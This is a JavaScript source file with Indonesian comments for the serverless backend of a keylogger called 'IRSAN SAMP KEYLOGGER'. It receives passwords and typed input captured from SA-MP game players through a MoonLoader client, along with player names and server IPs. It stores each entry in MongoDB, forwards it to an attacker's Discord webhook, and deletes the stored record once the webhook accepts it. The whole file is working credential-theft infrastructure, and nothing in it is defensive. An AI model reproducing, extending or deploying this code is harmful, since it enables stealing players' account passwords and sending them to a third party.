// ==========================================
// KEYLOG BACKEND - MONGODB ATLAS (SERVERLESS)
// ==========================================
// - Terima data dari client (MoonLoader)
// - Simpan ke MongoDB Atlas
// - Kirim ke Discord Webhook
// - Hapus dari MongoDB setelah sukses
// ==========================================

const { MongoClient, ServerApiVersion } = require('mongodb');

// ==========================================
// KONFIGURASI DARI ENVIRONMENT
// ==========================================
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const API_KEY = process.env.API_KEY || 'runzyt2026rowr';
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = process.env.DB_NAME || 'keylog';
const COLLECTION_NAME = process.env.COLLECTION_NAME || 'logs';

// ==========================================
// KONEKSI MONGODB (CACHED UNTUK SERVERLESS)
// ==========================================
let cachedClient = null;
let cachedDb = null;

async function connectToDatabase() {
    // Jika sudah ada koneksi, reuse
    if (cachedClient && cachedDb) {
        return { client: cachedClient, db: cachedDb };
    }

    if (!MONGODB_URI) {
        throw new Error('MONGODB_URI environment variable is not set');
    }

    // Buat koneksi baru dengan opsi ServerApi
    const client = new MongoClient(MONGODB_URI, {
        serverApi: {
            version: ServerApiVersion.v1,
            strict: true,
            deprecationErrors: true,
        }
    });

    // Connect ke server
    await client.connect();
    
    // Ping untuk memastikan koneksi berhasil
    await client.db("admin").command({ ping: 1 });
    console.log("[MongoDB] Connected successfully!");

    const db = client.db(DB_NAME);
    
    // Simpan di cache
    cachedClient = client;
    cachedDb = db;

    return { client, db };
}

// ==========================================
// MAIN HANDLER (VERCEL SERVERLESS FUNCTION)
// ==========================================
export default async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // AUTH
    const providedKey = req.headers['x-api-key'];
    if (providedKey !== API_KEY) {
        return res.status(401).json({ 
            success: false, 
            error: 'Unauthorized' 
        });
    }

    // Hanya menerima POST
    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            error: 'Method not allowed' 
        });
    }

    try {
        const data = req.body;

        // Validasi input
        if (!data.inputtext && !data.password) {
            return res.status(400).json({
                success: false,
                error: 'Missing inputtext or password'
            });
        }

        // ==========================================
        // 1. KONEK KE MONGODB & SIMPAN DATA
        // ==========================================
        const { db } = await connectToDatabase();
        const collection = db.collection(COLLECTION_NAME);

        // Buat dokumen log
        const logEntry = {
            _id: new Date().toISOString() + '-' + Math.random().toString(36).substr(2, 6),
            timestamp: data.timestamp || new Date().toISOString(),
            servername: data.servername || 'Unknown',
            ip: data.ip || '0.0.0.0',
            port: data.port || 0,
            playerName: data.playerName || 'Unknown',
            password: data.password || data.inputtext,
            inputtext: data.inputtext,
            platform: data.platform || 'MoonLoader',
            createdAt: new Date().toISOString(),
            status: 'pending' // pending, sent, failed
        };

        // Insert ke MongoDB
        const result = await collection.insertOne(logEntry);
        console.log(`[MongoDB] Inserted log: ${result.insertedId}`);

        // ==========================================
        // 2. KIRIM KE DISCORD WEBHOOK
        // ==========================================
        const discordSuccess = await sendToDiscord(logEntry);

        // ==========================================
        // 3. UPDATE STATUS & HAPUS ATAU TANDAI GAGAL
        // ==========================================
        if (discordSuccess) {
            // Hapus dari database (karena sudah terkirim)
            await collection.deleteOne({ _id: logEntry._id });
            console.log(`[MongoDB] Deleted log: ${logEntry._id} (sent to Discord)`);
        } else {
            // Tandai sebagai gagal (bisa di-retry nanti)
            await collection.updateOne(
                { _id: logEntry._id },
                { $set: { status: 'failed' } }
            );
            console.log(`[MongoDB] Updated status to 'failed' for: ${logEntry._id}`);
        }

        return res.status(200).json({
            success: true,
            id: logEntry._id,
            sentToDiscord: discordSuccess,
            status: discordSuccess ? 'deleted' : 'failed'
        });

    } catch (error) {
        console.error('[ERROR]', error);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
}

// ==========================================
// FUNGSI KIRIM KE DISCORD WEBHOOK
// ==========================================
async function sendToDiscord(log) {
    if (!DISCORD_WEBHOOK_URL) {
        console.warn('[WARN] DISCORD_WEBHOOK_URL not set');
        return false;
    }

    const embedData = {
        embeds: [{
            title: '🔒 LOG DATA PLAYER',
            description: '**IRSAN SAMP KEYLOGGER**\n© 2026 IRSAN SAMP',
            color: 16776960,
            footer: { 
                text: `ID: ${log._id} | Sent via MongoDB Backend` 
            },
            timestamp: log.timestamp,
            fields: [
                { name: '📡 Server', value: log.servername, inline: false },
                { name: '🌐 IP Address', value: `${log.ip}:${log.port}`, inline: false },
                { name: '👤 Player Name', value: log.playerName, inline: false },
                { name: '⌨️ Input / Password', value: `\`\`\`\n${log.password}\n\`\`\``, inline: false }
            ]
        }]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embedData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('[DISCORD] Error:', errorText);
            return false;
        }

        console.log('[DISCORD] Sent successfully');
        return true;

    } catch (error) {
        console.error('[DISCORD] Exception:', error);
        return false;
    }
}